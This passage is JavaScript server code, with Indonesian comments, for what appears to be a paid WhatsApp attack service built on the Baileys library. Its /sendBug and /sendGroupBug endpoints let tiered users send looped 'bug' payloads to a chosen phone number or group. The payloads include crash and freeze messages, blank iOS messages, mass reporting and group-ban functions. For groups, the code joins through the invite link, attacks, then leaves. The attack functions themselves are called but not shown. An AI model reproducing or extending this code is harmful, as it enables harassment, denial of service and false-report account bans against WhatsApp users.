        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {
        const numbers = loadGlobalNumbers();

        if (numbers.length === 0) {
            return bot.sendMessage(chatId, "📱 Belum ada nomor global yang tersimpan.\n\nGunakan `/addnomberglobal <jumlah>` untuk menambah.", { parse_mode: "Markdown" });
        }

        // Format daftar nomor
        const numberList = numbers.map((n, i) => `${i + 1}. \`${n}\``).join('\n');
        
        const response = `
📱 *Daftar Nomor Global*

📊 Total: *${numbers.length}* nomor

📋 *Nomor:*
${numberList}

*Catatan:* Nomor ini bisa digunakan untuk berbagai keperluan.
        `.trim();

        await bot.sendMessage(chatId, response, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("[❌ LIST GLOBAL NUMBER ERROR]", err);
        bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

// ============================================================
// 📱 TELEGRAM COMMAND: /getnomber <jumlah> - Ambil nomor global
// ============================================================
bot.onText(/^\/getnomber\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const jumlah = parseInt(match[1]);

    // Cek izin - Hanya owner
    if (fromId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    try {
        const numbers = loadGlobalNumbers();

        if (numbers.length === 0) {
            return bot.sendMessage(chatId, "📱 Tidak ada nomor global yang tersimpan.\n\nGunakan `/addnomberglobal <jumlah>` untuk menambah.", { parse_mode: "Markdown" });
        }

        // Ambil nomor secara round-robin / acak
        const shuffled = [...numbers];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        const selected = shuffled.slice(0, Math.min(jumlah, numbers.length));

        const response = `
📱 *Nomor Global Terpilih*

🎯 Diminta: ${jumlah}
✅ Tersedia: ${selected.length}

📋 *Nomor:*
${selected.map((n, i) => `${i + 1}. \`${n}\``).join('\n')}
        `.trim();

        await bot.sendMessage(chatId, response, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("[❌ GET GLOBAL NUMBER ERROR]", err);
        bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

// ============================================================
// 📱 CALLBACK QUERY - Konfirmasi hapus nomor
// ============================================================
// Tambahkan di bagian callback_query handler yang sudah ada
// Di dalam bot.on("callback_query", async (query) => { ... })

// Tambahkan case ini di dalam switch atau if-else callback
// case "confirm_dellnomber":
// case "cancel_dellnomber":

// ============================================================
// 📱 API ENDPOINT - Get global numbers (untuk Flutter)
// ============================================================
app.get("/getGlobalNumbers", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user || (user.role !== 'owner' && user.role !== 'admin')) {
        return res.status(403).json({ valid: false, error: "Access denied" });
    }

    const numbers = loadGlobalNumbers();
    return res.json({
        valid: true,
        total: numbers.length,
        numbers: numbers
    });
});

// ============================================================
// 📱 API ENDPOINT - Add global numbers (untuk Flutter)
// ============================================================
app.post("/addGlobalNumbers", (req, res) => {
    const { key, count } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user || user.role !== 'owner') {
        return res.status(403).json({ valid: false, error: "Only owner can add global numbers" });
    }

    const jumlah = parseInt(count) || 1;
    if (jumlah < 1 || jumlah > 100) {
        return res.status(400).json({ valid: false, error: "Count must be between 1 and 100" });
    }

    const existingNumbers = loadGlobalNumbers();
    const newNumbers = [];
    for (let i = 0; i < jumlah; i++) {
        let newNumber;
        let attempts = 0;
        do {
            newNumber = generateRandomNumber();
            attempts++;
        } while (existingNumbers.includes(newNumber) && attempts < 50);
        
        if (!existingNumbers.includes(newNumber)) {
            newNumbers.push(newNumber);
        }
    }

    const allNumbers = [...existingNumbers, ...newNumbers];
    saveGlobalNumbers(allNumbers);

    return res.json({
        valid: true,
        added: newNumbers.length,
        total: allNumbers.length,
        numbers: allNumbers
    });
});

// ============================================================
// 📱 API ENDPOINT - Delete all global numbers (untuk Flutter)
// ============================================================
app.delete("/deleteGlobalNumbers", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user || user.role !== 'owner') {
        return res.status(403).json({ valid: false, error: "Only owner can delete global numbers" });
    }

    const count = loadGlobalNumbers().length;
    saveGlobalNumbers([]);

    return res.json({
        valid: true,
        deleted: count,
        message: `Deleted ${count} global numbers`
    });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  const senderType = req.query.senderType || 'private';
  let { target } = req.query;

  target = (target || "").replace(/\D/g, "");

  console.log(`[📤 BUG] Send bug to ${target} | key ${key} | bug: ${bug} | senderType: ${senderType}`);

  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();

  const user = db.find(u => u.username === keyInfo.username);

  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  const role = user.role || "member";

  // ==================== BARIS 940-970 ====================
  // 🔐 GLOBAL SENDER — Daily limit per role
  if (senderType === 'global') {

    const limitCheck = checkGlobalSenderLimit(user.username, role);

    if (!limitCheck.allowed) {
      return res.json({
        valid: false,
        globalLimit: true,
        message: limitCheck.reason,
        used: limitCheck.used || 0,
        limit: limitCheck.limit || 0
      });
    }

    if (countActiveGlobalSenders() === 0) {
      return res.json({
        valid: false,
        message: "❌ Tidak ada global sender aktif."
      });
    }
    
    // Kirim informasi limit ke response (opsional)
    var limitInfo = {
      limit: limitCheck.limit === 999 ? '∞' : limitCheck.limit,
      used: limitCheck.used || 0,
      remaining: limitCheck.remaining === '∞' ? '∞' : limitCheck.remaining
    };
  }
  // ==================== END BARIS 940-970 ====================

  // ===== COOLDOWN =====
  const roleCooldowns = {
    member: 30,
    reseller: 20,
    admin: 10,
    owner: 5,
    tk: 0,
  };

  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) {
    user.lastSend = 0;
  }

  const now = Date.now();

  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {

    console.log(`${user.username} Still Cooldown`);

    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;

  saveDatabase(db);

  // 📊 Catat pemakaian global sender harian
  if (senderType === 'global') {

    incrementGlobalSenderUsage(user.username, role);

    const usage = globalSenderUsage[user.username];

    const limit = GLOBAL_SENDER_DAILY_LIMIT[role];

    const remaining = limit === 999
      ? '∞'
      : (limit - usage.count);

    console.log(
      `[🌐 GLOBAL LIMIT] ${user.username} (${role}): ${usage.count}/${limit === 999 ? '∞' : limit} hari ini. Sisa: ${remaining}`
    );
  }

  console.log(`${user.username} Trigger Cooldown`);

  // ==================== BARIS 1050-1070 ====================
  // Setelah cooldown check dan sebelum res.json
  if (senderType === 'global') {
    const limit = GLOBAL_SENDER_DAILY_LIMIT[role];
    const used = globalSenderUsage[user.username]?.count || 0;
    limitInfo = {
      limit: limit === 999 ? '∞' : limit,
      used: used,
      remaining: limit === 999 ? '∞' : (limit - used)
    };
  }

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    senderType,
    limit: limitInfo
  });
  // ==================== END BARIS 1050-1070 ====================

  // ================= BACKGROUND =================
  setImmediate(async () => {

    console.log("Received Signal");

    const attemptSend = async (sock, retry = false) => {

      try {

        // ✅ FIX #1: Validate socket connection
        if (!sock || !sock.user || !sock.user.id) {
          console.warn(`[❌ SOCKET ERROR] Socket tidak siap/invalid`);
          return false;
        }

        // ✅ FIX #1: Validate target
        if (!target || target.trim() === '') {
          console.warn(`[❌ TARGET ERROR] Target nomor tidak valid`);
          return false;
        }

        const targetJid = target + "@s.whatsapp.net";

        console.log(`[📡 SEND] ${targetJid} via ${senderType}`);

        switch (bug) { 
      
      case "delay_freze":  
        for (let i = 0; i < 110; i++)     
        await DelayXCrash(sock, targetJid);  
        await sleep(1300);             
        await Invisblev2(sock, targetJid);  
        await sleep(1300);           
        break;      
      
      case "stiker_blank":  
        for (let i = 0; i < 5; i++)     
        await stckerr(sock, targetJid);  
        await sleep(1300);             
        await stikerr(sock, targetJid);  
        await sleep(1300);           
        break;      
        
      case "delay_INvisible_No_Spam_1":  
        for (let i = 0; i < 70; i++)     
        await DelayXCrash(sock, targetJid);  
        await sleep(1300);              
        break;      
        
      case "delay_INvisible_No_Spam_2":  
        for (let i = 0; i < 90; i++)     
        await DelayXCrash(sock, targetJid);  
        await sleep(1300);              
        break;      
      
      case "delay_INvisible_No_Spam_3":  
        for (let i = 0; i < 100; i++)     
        await DelayXCrash(sock, targetJid);  
        await sleep(1300);              
        break;      
      
      case "delay_INvisible_No_Spam_4":  
        for (let i = 0; i < 150; i++)     
        await DelayXCrash(sock, targetJid);  
        await sleep(1300);              
        break;      
        
      case "Repp_Nomber":  
        for (let i = 0; i < 105; i++)     
        await reportnomber(sock, targetJid);  
        await sleep(1300);              
        break;      
      
      case "Repp_Nomber_2":  
        for (let i = 0; i < 305; i++)     
        await reportnomber(sock, targetJid);  
        await sleep(1300);              
        break;      
        
      case "Blank_Ios":  
        for (let i = 0; i < 15; i++)   
        await BlankIos(sock, targetJid);  
        await sleep(1300);       
        await invisble(sock, targetJid);  
        await sleep(1200);           
        break;
    }  

        console.log(`[✅ SUCCESS] Bug '${bug}' ke ${target}`);

        return true;

      } catch (err) {

        console.warn(`[⚠️ ERROR] ${err.message}`);

        if (!retry) {

          let retrySock = null;

          if (senderType === 'global') {

            retrySock = getActiveGlobalSender();

          } else {

            retrySock = await checkActiveSessionInFolder(user.username);

            // fallback ke global saat retry juga
            if (!retrySock) {

              const allowedRoles = ["reseller", "admin", "owner", "tk"];

              if (!allowedRoles.includes(role)) {
                console.warn(`[❌ RETRY FALLBACK DENIED]`);
                return false;
              }

              const remaining = getFallbackRemaining(user.username, role);

              if (remaining <= 0) {
                console.warn(`[❌ RETRY FALLBACK HABIS]`);
                return false;
              }

              retrySock = getActiveGlobalSender();

              if (retrySock) {

                const used = useFallback(user.username, role);

                if (!used) {
                  console.warn(`[❌ RETRY FALLBACK FAILED]`);
                  return false;
                }

                const sisa = getFallbackRemaining(user.username, role);

                console.log(
                  `[🌐 RETRY FALLBACK] ${user.username} memakai fallback. Sisa: ${sisa}`
                );
              }
            }
          }

          if (!retrySock) {
            console.warn(`[❌ RETRY FAIL] Tidak ada sender tersedia.`);
            return false;
          }

          return await attemptSend(retrySock, true);
        }

        console.warn(`[❌ FAILED TOTAL] ${target}`);

        return false;
      }
    };

    let sock = null;

    if (senderType === 'global') {

      sock = getActiveGlobalSender();

      if (!sock) {
        console.warn(`[❌ NO GLOBAL SOCK] Tidak ada global sender.`);
        return;
      }

      // Tambahkan log untuk mengetahui sender mana yang digunakan
      const senderNumber = Object.keys(globalConnections).find(key => globalConnections[key] === sock);
      console.log(`[🌐 GLOBAL] Sender ${censorNumber(senderNumber)} digunakan untuk bug ke ${target}`);

    } else {

      sock = await checkActiveSessionInFolder(user.username);

      // fallback ke global khusus role tertentu
      if (!sock) {

        const allowedRoles = ["reseller", "admin", "owner", "tk"];

        if (!allowedRoles.includes(role)) {
          console.warn(`[❌ FALLBACK DENIED] Role ${role} tidak bisa fallback.`);
          return;
        }

        const remaining = getFallbackRemaining(user.username, role);

        if (remaining <= 0) {
          console.warn(`[❌ FALLBACK HABIS] ${user.username}`);
          return;
        }

        console.warn(`[⚠️ PRIVATE TIDAK ADA] Coba pakai GLOBAL...`);

        sock = getActiveGlobalSender();

        if (!sock) {
          console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif (private & global).`);
          return;
        }

        const used = useFallback(user.username, role);

        if (!used) {
          console.warn(`[❌ FALLBACK GAGAL DIGUNAKAN]`);
          return;
        }

        const sisa = getFallbackRemaining(user.username, role);

        console.log(
          `[🌐 FALLBACK] ${user.username} memakai fallback. Sisa: ${sisa}`
        );

        // Log sender yang digunakan untuk fallback
        const senderNumber = Object.keys(globalConnections).find(key => globalConnections[key] === sock);
        console.log(`[🌐 FALLBACK] Menggunakan sender ${censorNumber(senderNumber)} untuk ${user.username}`);

      } else {

        console.log(`[👤 PRIVATE] Sender user digunakan`);
      }
    }

    await attemptSend(sock);

  });
});


// ============================================================
// 🎯 SEND GROUP BUG — Auto Private Sender
// ============================================================
// Replace the sendGroupBug endpoint with this improved version
app.post("/sendGroupBug", async (req, res) => {
  const { key, bug, link, jid } = req.body;

  if (!link && !jid) {
    return res.json({
      status: false,
      message: "Masukkan link grup atau jid"
    });
  }

  // Validasi key
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({
      status: false,
      message: "Invalid session key"
    });
  }

  // Cek user & role
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({
      status: false,
      message: "User not found"
    });
  }

  // Cek cooldown
  const roleCooldowns = {
    member: 30,
    reseller: 20,
    admin: 10,
    owner: 5,
    tk: 0,
  };

  const cooldownSeconds = roleCooldowns[user.role] || 60;
  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      status: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      message: `Cooldown: Tunggu ${cooldownSeconds - diffSeconds} detik`
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  // 🔥 Cari sender dengan validasi yang lebih baik
  let sock = await checkActiveSessionInFolder(user.username);
  
  // Jika tidak ada sender pribadi, coba pairing otomatis
  if (!sock) {
    console.log(`[⚠️ GROUP BUG] Tidak ada sender pribadi untuk ${user.username}, mencoba pairing...`);
    
    const userFolder = path.join('permenmd', user.username);
    let pairedNumber = null;
    
    if (fs.existsSync(userFolder)) {
      const files = fs.readdirSync(userFolder).filter(f => f.endsWith('.json'));
      if (files.length > 0) {
        pairedNumber = path.basename(files[0], '.json');
        console.log(`[🔄 GROUP BUG] Menemukan session ${pairedNumber}, mencoba koneksi ulang...`);
        
        try {
          const sessionPath = path.join(userFolder, pairedNumber);
          if (fs.existsSync(sessionPath)) {
            const { state } = await useMultiFileAuthState(sessionPath);
            const { version } = await fetchLatestBaileysVersion();
            
            const newSock = makeWASocket({
              auth: state,
              printQRInTerminal: false,
              logger: pino({ level: "silent" }),
              version: version,
              defaultQueryTimeoutMs: undefined,
              // 🔥 Tambahkan ini untuk koneksi yang lebih stabil
              connectTimeoutMs: 30000,
              keepAliveIntervalMs: 10000,
            });
            
            // Tunggu koneksi terbuka dengan timeout yang lebih baik
            const connectionResult = await new Promise((resolve) => {
              const timeout = setTimeout(() => resolve(false), 20000);
              newSock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
                if (connection === "open") {
                  clearTimeout(timeout);
                  activeConnections[pairedNumber] = newSock;
                  sock = newSock;
                  resolve(true);
                } else if (connection === "close") {
                  clearTimeout(timeout);
                  const statusCode = lastDisconnect?.error?.output?.statusCode;
                  if (statusCode === 409) {
                    console.log(`[⚠️ CONFLICT] Session conflict for ${pairedNumber}, menunggu...`);
                    // Tunggu sebentar lalu coba lagi
                    setTimeout(() => resolve(false), 5000);
                  } else {
                    resolve(false);
                  }
                }
              });
            });
            
            if (!connectionResult) {
              console.log(`[❌ GROUP BUG] Gagal koneksi ulang ${pairedNumber}`);
              sock = null;
            }
          }
        } catch (err) {
          console.log(`[❌ GROUP BUG] Gagal reconnect ${pairedNumber}: ${err.message}`);
          sock = null;
        }
      }
    }
    
    // Jika tetap tidak ada sender, minta user pairing dulu
    if (!sock) {
      return res.json({
        status: false,
        needPairing: true,
        message: "❌ Tidak ada sender WhatsApp aktif.\nSilahkan pairing nomor WhatsApp terlebih dahulu di menu 'Pairing'."
      });
    }
  }

  // 🔥 Validasi tambahan: pastikan socket masih aktif
  if (!sock || !sock.user || !sock.user.id) {
    return res.json({
      status: false,
      message: "❌ Sender tidak valid atau belum siap. Coba lagi nanti."
    });
  }

  try {
    let groupJid;

    if (link) {
      const regex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
      const match = link.match(regex);

      if (!match) {
        return res.json({
          status: false,
          message: "Link grup invalid"
        });
      }

      // 🔥 Coba join grup dengan retry mechanism
      let joinAttempts = 0;
      let joinSuccess = false;
      let lastError = null;
      
      while (joinAttempts < 3 && !joinSuccess) {
        try {
          console.log(`[🔄 GROUP BUG] Mencoba join (attempt ${joinAttempts + 1}/3)`);
          groupJid = await sock.groupAcceptInvite(match[1]);
          joinSuccess = true;
          console.log(`[✅ GROUP BUG] Berhasil join grup: ${groupJid}`);
        } catch (joinErr) {
          lastError = joinErr;
          joinAttempts++;
          console.log(`[❌ GROUP BUG] Gagal join attempt ${joinAttempts}: ${joinErr.message}`);
          
          // Jika conflict (409), tunggu sebentar lalu refresh socket
          if (joinErr.message?.includes('conflict') || joinErr.output?.statusCode === 409) {
            console.log(`[🔄 GROUP BUG] Conflict detected, mencoba refresh socket...`);
            // Coba reconnect socket
            try {
              const userFolder = path.join('permenmd', user.username);
              const files = fs.readdirSync(userFolder).filter(f => f.endsWith('.json'));
              if (files.length > 0) {
                const sessionName = path.basename(files[0], '.json');
                const sessionPath = path.join(userFolder, sessionName);
                const { state } = await useMultiFileAuthState(sessionPath);
                const { version } = await fetchLatestBaileysVersion();
                
                const newSock = makeWASocket({
                  auth: state,
                  printQRInTerminal: false,
                  logger: pino({ level: "silent" }),
                  version: version,
                  defaultQueryTimeoutMs: undefined,
                  connectTimeoutMs: 30000,
                });
                
                await new Promise((resolve) => {
                  const timeout = setTimeout(() => resolve(false), 15000);
                  newSock.ev.on("connection.update", ({ connection }) => {
                    if (connection === "open") {
                      clearTimeout(timeout);
                      activeConnections[sessionName] = newSock;
                      sock = newSock;
                      resolve(true);
                    }
                  });
                });
              }
            } catch (refreshErr) {
              console.log(`[❌ GROUP BUG] Gagal refresh socket: ${refreshErr.message}`);
            }
            
            // Tunggu sebelum retry
            await new Promise(resolve => setTimeout(resolve, 3000));
          } else {
            // Error lain, break loop
            break;
          }
        }
      }

      if (!joinSuccess) {
        console.log(`[❌ GROUP BUG] Gagal join grup setelah ${joinAttempts} percobaan`);
        return res.json({
          status: false,
          message: `Gagal join grup: ${lastError?.message || 'Unknown error'}`
        });
      }

    } else {
      if (!jid.endsWith("@g.us")) {
        return res.json({
          status: false,
          message: "JID grup tidak valid"
        });
      }
      groupJid = jid;
    }

    // Eksekusi bug berdasarkan jenis
    let bugName = "";
    switch (bug) {
      case "group_ban":
        await BanGroup(sock, groupJid);
        bugName = "BAN GROUP";
        break;
      case "report_group":
        await reportGroup(sock, groupJid);
        bugName = "REPP GROUP";
        break;
      case "group_blank":
        await freezeGroup(sock, groupJid);
        bugName = "FREEZE BLANK";
        break;
      default:
        return res.json({
          status: false,
          message: `Bug '${bug}' tidak dikenal untuk grup`
        });
    }

    // Setelah attack, leave grup
    try {
      await sock.groupLeave(groupJid);
      console.log(`[✅ GROUP BUG] Berhasil leave grup: ${groupJid}`);
    } catch (leaveErr) {
      console.log(`[⚠️ GROUP BUG] Gagal leave grup: ${leaveErr.message}`);
    }

    return res.json({
      status: true,
      message: `✅ Berhasil ${bugName}!`,
      target: groupJid,
      bug: bugName
    });

  } catch (err) {
    console.error("[❌ GROUP BUG ERROR]", err);
    return res.json({
      status: false,
      message: err.message || "Gagal menjalankan bug grup"
    });
  }
});


// ============================================================

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({ sessionName: sessionName });
    }
  }

  return activeCreds;
}

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username);
  return res.json({
    valid: true,
    connections: conns
  });
});

// ============================================================
// 🗑️ DELETE SENDER — Menghapus session user tertentu
// ============================================================
app.delete("/deleteSender", (req, res) => {
  const { key, senderName } = req.query;
  
  console.log(`[🗑️ DELETE SENDER] Request hapus sender '${senderName}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE SENDER] Key tidak valid.");
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ DELETE SENDER] User tidak ditemukan.");
    return res.status(401).json({ valid: false, message: "User not found" });
  }

  if (!senderName) {
    return res.status(400).json({ valid: false, message: "senderName is required" });
  }

  try {
    // 1. Hapus dari activeConnections jika sedang aktif
    if (activeConnections[senderName]) {
      try {
        activeConnections[senderName].ws?.close();
      } catch (e) {}
      delete activeConnections[senderName];
      console.log(`[🗑️ DELETE SENDER] ${senderName} dihapus dari activeConnections`);
    }

    // 2. Hapus folder session di permenmd/{username}/{senderName}
    const sessionPath = path.join('permenmd', user.username, senderName);
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
      console.log(`[🗑️ DELETE SENDER] Folder session ${sessionPath} dihapus`);
    }

    // 3. Hapus file .json di permenmd/{username}/
    const jsonPath = path.join('permenmd', user.username, `${senderName}.json`);
    if (fs.existsSync(jsonPath)) {
      fs.unlinkSync(jsonPath);
      console.log(`[🗑️ DELETE SENDER] File ${jsonPath} dihapus`);
    }

    // 4. Cek juga di folder global (kalau ada)
    const globalPath = path.join('permenmd', 'global', senderName);
    if (fs.existsSync(globalPath)) {
      fs.rmSync(globalPath, { recursive: true, force: true });
      console.log(`[🗑️ DELETE SENDER] Folder global ${globalPath} dihapus`);
      
      // Hapus dari globalConnections
      if (globalConnections[senderName]) {
        delete globalConnections[senderName];
      }
      
      // Hapus dari globalSenders.json
      const senders = loadGlobalSenders().filter(s => s.number !== senderName);
      saveGlobalSenders(senders);
    }

    // 5. Hapus dari biz dan mess jika ada
    if (biz[senderName]) {
      delete biz[senderName];
    }
    if (mess[senderName]) {
      delete mess[senderName];
    }

    console.log(`[✅ DELETE SENDER] ${senderName} berhasil dihapus oleh ${user.username}`);
    
    return res.json({ 
      valid: true, 
      message: `Sender ${senderName} berhasil dihapus.`,
      deleted: senderName
    });

  } catch (err) {
    console.error(`[❌ DELETE SENDER ERROR] ${err.message}`);
    return res.status(500).json({ 
      valid: false, 
      message: `Error: ${err.message}` 
    });
  }
});
// ============================================================
// 🌐 GET GLOBAL SENDERS — Untuk Apk Flutter (list + sensor)
// ============================================================
app.get("/getGlobalSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const senders = loadGlobalSenders();

  const result = senders.map(s => ({
    number: censorNumber(s.number),      // nomor tersensor
    active: !!globalConnections[s.number], // status real-time
    addedAt: s.addedAt || null
  }));

  return res.json({
    valid: true,
    total: result.length,
    active: result.filter(s => s.active).length,
    senders: result
  });
});
// ============================================================

// ============================================================
// ❌ REMOVE GLOBAL SENDER — Owner only
// ============================================================
app.post("/removeGlobalSender", (req, res) => {
  const { key, number } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || user.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Hanya owner yang bisa menghapus global sender." });
  }

  const cleanNumber = String(number).replace(/\D/g, '');

  if (globalConnections[cleanNumber]) {
    try { globalConnections[cleanNumber].ws.close(); } catch (e) { }
    delete globalConnections[cleanNumber];
  }

  const sessionDir = path.join('permenmd', 'global', cleanNumber);
  if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

  const senders = loadGlobalSenders().filter(s => s.number !== cleanNumber);
  saveGlobalSenders(senders);

  console.log(`[🌐 GLOBAL] Sender ${cleanNumber} dihapus oleh ${user.username}`);
  return res.json({ valid: true, message: `Global sender ${censorNumber(cleanNumber)} berhasil dihapus.` });
});
// ============================================================
// ============================================================
// 🔑 RESOLVE KEY INFO — Fix untuk Public Chat
// ============================================================
function resolveKeyInfo(key) {
  if (!key) return null;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return null;
  
  // Cek apakah session key masih valid (tidak expired)
  if (keyInfo.expires && Date.now() > keyInfo.expires) {
    return null;
  }
  
  return keyInfo;
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) { 
    console.log(`[❌ PAIRING] Gagal setelah ${attempt} percobaan untuk ${number}`);
    return false; 
  }
  
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
      // 🔥 TAMBAHKAN INI UNTUK CEK KONEKSI
      connectTimeoutMs: 30000,
      keepAliveIntervalMs: 10000,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut && attempt < 5) {
          console.log(`🔄 Reconnecting ${number} Attempt ${attempt + 1}/5`);
          await waiting(5000);
          await pairingWa(number, owner, attempt + 1);
        } else {
          delete activeConnections[number];
          console.log(`[❌ PAIRING] ${number} gagal konek.`);
        }
      } else if (connection === "open") {
        activeConnections[number] = sock;
        const sourceCreds = path.join(sessionDir, 'creds.json');
        const destCreds = path.join('permenmd', owner, `${number}.json`);
        try {
          await waiting(3000);
          if (fs.existsSync(sourceCreds)) {
            const data = fs.readFileSync(sourceCreds);
            fs.writeFileSync(destCreds, data);
            console.log(`✅ Session saved to ${destCreds}`);
          }
        } catch (e) {
          console.error(`❌ Failed to rewrite creds: ${e.message}`);
        }
      }
    });

    // 🔥 GENERATE PAIRING CODE DENGAN HANDLER YANG LEBIH BAIK
    if (!sock.authState.creds.registered) {
      await waiting(1500);
      let code;
      try {
        code = await Promise.race([
          sock.requestPairingCode(number),
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Timeout pairing')), 30000)
          )
        ]);
        console.log(`[🔑 PAIRING] Code untuk ${number}: ${code}`);
        return code;
      } catch (pairingErr) {
        console.error(`[❌ PAIRING ERROR] ${pairingErr.message}`);
        return null;
      }
    }

    return null;
  } catch (err) {
    console.error(`[❌ PAIRING FATAL] ${err.message}`);
    return null;
  }
}

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  
  console.log(`[🔑 PAIRING] Request pairing untuk ${number} dengan key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ PAIRING] Key tidak valid.");
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ PAIRING] User tidak ditemukan.");
    return res.status(401).json({ valid: false, message: "User not found" });
  }

  if (!number) {
    return res.status(400).json({ valid: false, message: "Number is required" });
  }

  // Clean number
  const cleanNumber = String(number).replace(/\D/g, '');
  if (cleanNumber.length < 8) {
    return res.status(400).json({ valid: false, message: "Invalid phone number" });
  }

  try {
    // Cek apakah session sudah ada
    const sessionDir = path.join('permenmd', user.username, cleanNumber);
    const credsPath = path.join(sessionDir, 'creds.json');
    
    // Jika creds sudah ada, hapus dulu untuk pairing ulang (fresh pairing)
    if (fs.existsSync(credsPath)) {
      console.log(`[🔄 PAIRING] Session sudah ada, menghapus untuk pairing ulang...`);
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    if (!fs.existsSync(`permenmd/${user.username}`)) {
      fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
    }
    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
      connectTimeoutMs: 30000,
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${cleanNumber}...`);
          await waiting(3000);
          // Re-try pairing
          const result = await pairingWa(cleanNumber, user.username);
          if (result) {
            console.log(`[✅ PAIRING] ${cleanNumber} berhasil reconnect`);
          }
        } else {
